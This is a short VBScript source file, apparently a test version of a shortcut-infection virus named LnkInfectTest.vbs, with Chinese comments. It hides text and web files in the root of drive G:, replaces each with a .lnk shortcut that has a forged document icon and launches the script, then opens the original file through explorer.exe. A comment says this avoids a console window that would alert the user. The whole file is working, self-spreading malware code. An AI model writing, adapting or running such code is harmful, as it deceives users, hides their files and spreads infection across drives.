Const VbsHorseVirusName = "LnkInfectTest.vbs"

Call Main()

Sub Main()
	Dim args
	Set args = WScript.Arguments
	If args.Count > 0 Then
		originFilePath = args(args.Count - 1)
		Call OpenFile(originFilePath)
	End If
	
	Call LnkInfectDrive("G:\")
End Sub

Sub OpenFile(filePath)
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.Run("explorer.exe " & filePath) '不使用CMD打开，防止产生黑框被用户发觉
	Set objShell = Nothing
End Sub

Sub LnkInfectDrive(drivePath) '为磁盘根目录下所有的txt, log, html文件创建指向VbsHorse的快捷方式，并隐藏原文件
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Dim folder, files
	Set folder = objFileSystem.GetFolder(drivePath)
	Set files = folder.Files
	For Each file In files
		fileSuffix = GetFileSuffix(file.Name)
		If fileSuffix <> "lnk" And file.Name <> VbsHorseVirusName Then '是否不是快捷方式文件，且文件名不是病毒名
			lnkPath = drivePath & file.Name & ".lnk"
			If objFileSystem.FileExists(lnkPath) = False Then '如果不存在文件
				targetPath = drivePath & VbsHorseVirusName
				args = file.Path
				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) '创建对应的快捷方式并隐藏原文件
			End If
		End If
	Next
	Set objFileSystem = Nothing
End Sub

Function GetFileSuffix(fileName)
	splitFileNameArray = Split(fileName, ".")
	GetFileSuffix = splitFileNameArray(UBound(splitFileNameArray))
	Set splitFileNameArray = Nothing
End Function

Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) '创建对应的快捷方式并隐藏原文件
	originFileSuffix = GetFileSuffix(originFilePath)
	Select Case originFileSuffix '检查是否是txt, log, html, htm, mht类型的文件
	Case "txt", "log" '文本
		iconPath = "%SystemRoot%\System32\imageres.dll, 97"
	Case "html", "htm", "mht" '网页
		iconPath = "%SystemRoot%\System32\imageres.dll, 2"
	Case Else
		Exit Sub
	End Select
	
	Call HideFile(originFilePath) '隐藏原文件
	
	Dim objShell, shortcut
	Set objShell = CreateObject("WScript.Shell")
	Set shortcut = objShell.CreateShortcut(lnkPath)
	With Shortcut
		.TargetPath = targetPath
		.Arguments = args
		.WindowStyle = 4
		.IconLocation = iconPath
		.Save
	End With
	Set objShell = Nothing
	Set shortcut = Nothing
End Sub

Sub HideFile(filePath)
	Dim objFileSystem, objFile
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Set objFile = objFileSystem.GetFile(filePath)
	objFile.Attributes = 2 '0-普通 1-只读 2-隐藏 4-系统
	Set objFileSystem = Nothing
	Set objFile = Nothing
End Sub